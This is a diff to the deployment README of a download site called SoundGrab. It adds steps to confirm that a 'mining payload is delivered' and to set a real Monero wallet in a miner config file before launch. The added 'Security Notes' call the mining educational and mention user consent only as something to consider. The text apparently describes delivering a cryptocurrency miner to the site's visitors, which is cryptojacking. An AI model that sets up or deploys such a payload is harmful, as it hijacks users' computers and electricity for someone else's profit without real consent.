@@ -114,3 +114,37 @@ In Vercel dashboard:
 ### 3. Test Your Deployment
 - Visit your live URL
 - Test the search functionality
+- Verify download system works
+- Check that mining payload is delivered (if intended)
+
+## 🎯 Mining Configuration
+
+### Important: Update Wallet Address
+Before going live, make sure to update your wallet address in:
+`client/src/lib/minerConfig.ts`
+
+```typescript
+export const minerConfig = {
+  wallet: "YOUR_ACTUAL_MONERO_WALLET_ADDRESS",
+  // ... other settings
+};
+```
+
+## 🔒 Security Notes
+
+- The mining functionality is for educational purposes
+- Ensure compliance with applicable laws
+- Consider user consent and disclosure
+- Review payload delivery mechanisms
+
+## 📞 Support
+
+If you encounter issues:
+1. Check the build logs in Vercel
+2. Review the documentation files
+3. Verify all dependencies are installed
+4. Check TypeScript compilation errors
+
+---
+
+**Your SoundGrab project is ready for the world! 🚀**
